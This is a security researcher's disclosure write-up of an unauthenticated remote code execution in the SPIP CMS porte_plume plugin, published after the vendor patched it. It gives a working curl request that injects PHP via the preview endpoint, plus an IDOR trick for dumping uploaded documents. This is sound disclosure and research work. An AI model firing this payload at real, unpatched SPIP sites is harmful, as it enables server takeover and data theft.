Hi dear Sir, Madam. Please be informed that this is the **third** article dedicated to [Spip](https://www.spip.net/) 0-day research, if you haven't read the first ones, I'd recommend reading them first!

- [RCE on Spip and Root-Me](/hacking/rce_on_spip_and_root_me/)
- [RCE on Spip and Root-Me, v2!](/hacking/rce_on_spip_and_root_me_v2/)

This article will cover the `issue and exploit` for an `Unauthenticated Remote Code Execution` found on `Spip`, it has been patched in the releases for [4-3-0-alpha2, 4-2-13, and 4.1.16](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html).

<img class="img_med" src="release-note-security-headsup.png" alt="">

## What's the setup again?

This issue was tested on the latest back then: [4.2.9](https://files.spip.net/spip/archives/spip-v4.2.9.zip) Released the 8th of February 2024, it's SHA1 hash is [1987a75d18a57690e288be59e1c4a114cac51d84](https://spip.lerebooteux.fr/Release-Notes-25).

Oh yeah, the issue came form the [porte_plume plugin](https://plugins.spip.net/porte_plume.html), so if you update spip without updating the plugins as well, you might still be exposed! üëè

```bash
mise install php@8.1.0       # Recent install, should work on latest as well
pecl install -f libsodium    # Dependencies for Spip crypto stuff
echo extension=sodium.so | tee -a $(php --ini | grep -ioP "/.*/php.ini") # Add sodium.so to our php.ini config file
php -S 0.0.0.0:8000          # Simple webserver
http://0.0.0.0:8000/ecrire/  # The url to visit in order to setup the site
```

From there, pick a `sqlite` backend to keep the setup minimalist, create an admin account, and voil√†, you're done! It's empty as hell, yet enough to be exploited!

<img class="img_full" src="working-spip-setup.png" alt="">

## How was it caught?

Two years ago, I built and deployed a simpe cron task that would pull spip core and plugins changes daily at 9pm, split the diffs in small chunks of lines, render them, and push it to one of my private discord servers. It yield a few cute results, but nothing too scary for a few months. I was already reading as much code as I could in the actuel project, but in the meantime, having these new changes was helpful to know what were the current moving parts!

And one day, [this gem](https://git.spip.net/spip/porte_plume/-/commit/3ca4cf78b96d927121c767a720203845071b7fda) came up!

<img class="img_full" src="spip-code-diff.png" alt="">

For interested readers, a [dirty push-my-diffs PoC](https://github.com/laluka/push-my-diffs) has been released and shown during a [livestream](https://www.youtube.com/watch?v=iFEDYryTKQw)! üòá

{{< youtube iFEDYryTKQw >}}

Now, let's head-out to the code part!

If you're a French reader, you'll quick notice THE line. 

> If there is php that comes from a model in here, it must be eval'd as it's not a regular page.\
> - Someone, probably a monday morning

And the code does just that. If a flag states that modeles must be protected, then some sanitization takes place, then the page's content ends up in an eval statement!

As I've been playing with Spip for a while now, I knew this piece of code lived in the `porte_plume` plugin, and was reachable without account!

So... Can we do it? Can we reach the mighty eval statement?

<img class="img_small" src="thinking-mighty-eval.png" alt="">

## Chaining "features" to reach eval

One bug already known by quite a few researchers is the ability to abuse the previsualization feature to resolve document or images IDs to full document links. This is an IDOR in itself, has been reported, but was -afaik- deemed too painful to patch, or not prioritized.

Let's upload one image on our backend, and see how the link resolution feature behaves.

<img class="img_full" src="idor-id-to-url.png" alt="">

```bash
curl -sSkiL 'http://0.0.0.0:8000/index.php?action=porte_plume_previsu' -X POST -d 'data=AA<doc1>BB'
```

As stated, this allows us to resolve every document and images IDs to links. Currently, files do not benefit from other protections, and are exposed for direct access for images and document uploads, we can basically abuse this feature to dump the whole site content. Banger.

But wait, there's more!

The code received on discord states that if some php code lends in there, it will be eval'd, so can we get our code in there?

<img class="img_full" src="porte-plume-previsu-reflect.png" alt="">

Yes, no, maybe, it's complicated... For now, the sanitization part catches us and surrounds our attempt with warnings. And breaks our payload. But the Spip templating engine is fairly complex and it's definitely 100% spaghetti!

> No blame on the devs, it's php, and will always be.

By grepping around, we can determine that links are handled in a specific way to be resolved, while reading the function's code, one can find that url slugs can be used, text formats, and more.

<img class="img_full" src="link-format-templating.png" alt="">

More can be found on the slug system with extra greps and code reading:

```bash
grep -riP '>->'
# ecrire/public/assembler.php:    // Si un lien a ete passe en parametre, ex: [<modele1>->url] ou [<modele1|title_du_lien{hreflang}->url]

```

The previsualisation system is the same (or very similar) for post and comments. One easy way to get intimate with it is to play on the article redaction page.

<img class="img_full" src="article-redaction-page.png" alt="">

In here, we have the document uploader, possibility to insert documents by id, links, slugs, bold, italics, quoted, striked, code blocks, and more.

Turns out reflecting URLs with complex formatting might be broken when the right suite of filters is applyed! By writing a dead-simple fuzzer to submit all kind of urls and formats, and logging the content passed to the previously mentioned eval statement, things got lit!

I won't give every working payload here, but let's analyze one

```php
[<img111111>->URL`<?php system("id");?>`]
```

This is a:

- `[foo->bar]`            # Link seen as foo, pointing on bar
- `<img111111>`           # Resolve request to a non-existing image of id 111111
- `` `text` ``            # Bold text
- `<?php system("id");?>` # Php payload that executes the id command

So we have a link, made from a non-existing document, for which the slug contains a **bold** php payload!

## What's the sploit?

<img class="img_full" src="curl-exploit.png" alt="">

```bash
curl -sSkiL 'http://0.0.0.0:8000/index.php?action=porte_plume_previsu' -X POST -d 'data=AA_[<img111111>->URL`<?php system("id");?>`]_BB'
```

We're therefore abusing the unauth previsualization feature to reflect our terrific bb-text-like url that will keep the payload untouched due to the path formating takes!

## What's the patch?

This lead to two patchs, one in the core, and one in the porte_plume plugin!

- In the Core:
    - Urls got their own filtering function for templating
    - https://git.spip.net/spip/spip/-/merge_requests/5973/diffs
- In the Porte Plume plugin:
    - Access Control has been added for model previsualisation from an unauth context
    - https://git.spip.net/spip/porte_plume/-/commit/97f9d6dddcadc9a01b098ec3552e204ce1c7a2ab

> Side note here, I've had past disclosure that went... Not so well.
> This one was smooth, Spip Dev Team member were helpful and quick to react! üåπ

## BONUS: What's truly happening? Tracing with X-debug!

```bash
pecl install xdebug
mkdir /tmp/traces/
cat >> $(php --ini | grep -ioP "/.*/php.ini") << EOF
zend_extension=xdebug.so
xdebug.mode = trace
xdebug.start_with_request = yes
xdebug.trace_format = 1  ; Use the computer-readable format
xdebug.output_dir = "/tmp/traces"
EOF
# Restart the php simple server
php -S 0.0.0.0:8000
# Then trigger the exploit
curl -sSkiL 'http://0.0.0.0:8000/index.php?action=porte_plume_previsu' -X POST -d 'data=AA<doc1>BB'
# Then inspect the trace
gunzip /tmp/traces/trace.2713103059.xt.gz
bat /tmp/traces/trace.2713103059.xt
```

By snipping ‚úÄ some parts, or just grepping on our payload, we'll be able to find the exact culprits!

## BONUS: Unauth RCE on Spip... So you broke root-me again?

Well, hum... üëâüëà No. üò≠

The issue has been introduced a year ago, and `Root-Me is working on a rework`! ü•≥\
Therefore they did not spend time updating their Spip instance for over a year...

So, this time, a lack of update definitely helped for security!\
Feels like [php-8.1.0-dev backdoor](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/), right? üôÉ

But next article will cover `Yet Another Unauth RCE` that this time worked on [Root-Me.org](https://www.root-me.org/), so I hope you enjoyed this one, and will kindly wait for the next one! üíå
